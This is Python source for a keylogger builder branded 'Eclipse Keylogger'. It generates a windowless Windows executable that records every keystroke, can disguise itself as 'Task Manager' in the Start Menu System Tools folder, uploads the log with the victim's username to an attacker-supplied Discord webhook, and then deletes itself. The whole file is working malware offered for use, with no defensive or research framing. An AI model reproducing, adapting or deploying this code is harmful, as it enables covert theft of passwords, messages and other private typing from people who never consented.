import os
import time

def write_file(webhook, stopby, when, hide, f):
    f.write(f"""
import os
from datetime import datetime, date
import sys
from discord_webhook import DiscordWebhook
from pynput import keyboard
from pynput.keyboard import Key
import shutil

webhook = DiscordWebhook(
    url='{webhook}',
    username='Eclispe Keylogger')

if not os.path.exists('C:\\\\Windows\\\\temp\\\\Keystroke_Handler.ksh'):
    f = open('C:\\\\Windows\\\\temp\\\\Keystroke_Handler.ksh', 'a')
else:
    f = open('C:\\\\Windows\\\\temp\\\\Keystroke_Handler.ksh', 'w')

stopby ='{stopby}'
when = '{when}'
stop = False
hide = '{hide}'
if hide == 'yes':
    path = os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools'
    if sys.argv[0].split('.')[1] == 'py':
        os.rename(sys.argv[0], 'Task Manager.py')
        shutil.move('Task Manager.py', path)
    elif sys.argv[0].split('.')[1] == 'exe':
        os.rename(sys.argv[0], 'Task Manager.exe')
        shutil.move('Task Manager.exe', path)

def send_file():
    embed = {{
        'author': {{
            'name': f'Eclipse Keylogger',
        }},
        'thumbnail': {{
            'url': 'https://c.tenor.com/5bIxmMcQEp0AAAAC/cope-cope-harder.gif'
        }},
        'description': f'{os.getlogin()}_logs',
        'fields': [
            {{
                'name': '',
                'value': f'''```fix
                                       Characters Typed:  {{charstyped}}
                                       Keys Pressed:  {{keyspressed}}
                                        ```
                                    '''.replace(' ', ''),
                'inline': True
            }},
        ],
    }}
    # sending to webhook

    # Append webhook
    webhook.add_embed(embed)
    with open('C:\\\\Windows\\\\temp\\\\Keystroke_Handler.ksh', 'rb') as f:
        webhook.add_file(file=f.read(), filename=f'{{os.getlogin()}}-logs.txt')
        
    while True:
        try:
            response = webhook.execute()
            break
        except:
            print('append failed!')
            sleep(100)


charstyped = 0
linelength = 0
keyspressed = 0

def on_press(key):
    global charstyped
    global keyspressed
    try:
        current = str(key.char)
    except AttributeError:
        current = str(key)
    keycheck = current.split('.')
    if keycheck[0] != current:
        if keycheck[1] == 'space':
            f.write(' ')
            keyspressed += 1
        else:
            if keycheck[0] == 'Key':
                f.write(f'[{{keycheck[1].upper()}}]')
            keyspressed += 1
    else:
        f.write(current)
        charstyped += 1
        keyspressed += 1

def on_release(key):
    if stop:
        f.close()
        send_file()
        os.remove('C:\\\\Windows\\\\Temp\\\\Keystroke_Handler.ksh')
        if hide == 'yes':
            if sys.argv[0].split('.')[1] == 'py':
                os.remove(path + '\\\\Task Manager.py')
            elif sys.argv[0].split('.')[1] == 'exe':
                os.remove(path + '\\\\Task Manager.exe')
        else:
            os.remove(sys.argv[0])
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while True:
        if stopby == "DATE":
            current_time = datetime.now().time()
            if date.today().strftime('%m/%d/%y') == when:
                stop = True
                break
        if stopby == "CHARSTYPED":
            if (charstyped == int(when)):
                stop = True
                break
    listener.join()

""")
    f.close()

def build_exe():
    f = open('build_exe.bat', 'w')
    f.write('''
       
@Echo ON
ECHO Installing dependencies...
pip install pyinstaller
pip install discord_webhook
pip install pynput
pip install shutil

ECHO Building executable...
pyinstaller --clean --onefile --icon=NONE --name Executable --noconsole %cd%\\Build.py
ECHO Cleaning...
MOVE %cd%\\dist\\Build.exe* %cd%

del Build.spec
@RD /S /Q "%cd%\\build"
@RD /S /Q "%cd%\\dist"
    ''')
    f.close()

def main():
    print(f'''

     /$$$$$$$$           /$$ /$$                              
    | $$_____/          | $$|__/                              
    | $$        /$$$$$$$| $$ /$$  /$$$$$$   /$$$$$$$  /$$$$$$ 
    | $$$$$    /$$_____/| $$| $$ /$$__  $$ /$$_____/ /$$__  $$
    | $$__/   | $$      | $$| $$| $$  \ $$|  $$$$$$ | $$$$$$$$
    | $$      | $$      | $$| $$| $$  | $$ \____  $$| $$_____/
    | $$$$$$$$|  $$$$$$$| $$| $$| $$$$$$$/ /$$$$$$$/|  $$$$$$$
    |________/ \_______/|__/|__/| $$____/ |_______/  \_______/
                                | $$                          
                                | $$                          
                                |__/                                              
     /$$                                                        
    | $$                                                        
    | $$        /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
    | $$       /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$
    | $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$$$$$$$| $$  \__/
    | $$      | $$  | $$| $$  | $$| $$  | $$| $$_____/| $$      
    | $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$      
    |________/ \______/  \____  $$ \____  $$ \_______/|__/      
                         /$$  \ $$ /$$  \ $$                    
                        |  $$$$$$/|  $$$$$$/                    
                         \______/  \______/        
        ''')
    time.sleep(2)
    webhook = input("enter webhook: \n")
    while True:
        stopby = input("[1] Stop at certain date [2] stop after certain amount of characters have been typed \n")

        if stopby == "1":
            while True:
                hide = input("hide file when ran [YES/NO]")
                if hide.lower() == 'yes' or hide.lower() == 'no':
                    when = input("Enter date [MM/DD/YY]: \n")
                    time.sleep(0.5)
                    print(f"webhook is {webhook} \nstopping by time \nstopping on {when}\nhide file when ran? {hide}")
                    time.sleep(3)
                    print("opening file...")
                    time.sleep(0.5)
                    f = open("Build.py", "w")
                    print("writing to file...")
                    time.sleep(1)
                    write_file(webhook, "DATE", when, hide.lower(), f)
                    print("writen!")
                    time.sleep(0.3)
                    build_exe()
                    break
                else:
                    print("invalid command")
                    time.sleep(0.5)
                break
        elif stopby == "2":
            while True:
                hide = input("hide file when ran [YES/NO]")
                if hide.lower() == 'yes' or hide.lower() == 'no':
                    when = input("Enter character limit: \n")
                    time.sleep(0.5)
                    print(
                        f"webhook is {webhook} \nstopping by characters typed \nstopping when {when} characters are typed \nhide file when ran? {hide}")
                    time.sleep(3)
                    print("opening file...")
                    time.sleep(0.5)
                    f = open("Build.py", "w")
                    print("writing to file...")
                    time.sleep(1)
                    write_file(webhook, "CHARSTYPED", when, hide.lower(), f)
                    print("writen!")
                    time.sleep(0.3)
                    build_exe()
                    break
                else:
                    print("invalid command")
                    time.sleep(0.5)
            break
        else:
            print("invalid command \n")


if __name__ == "__main__":
    main()
    input("Press enter finish building...")



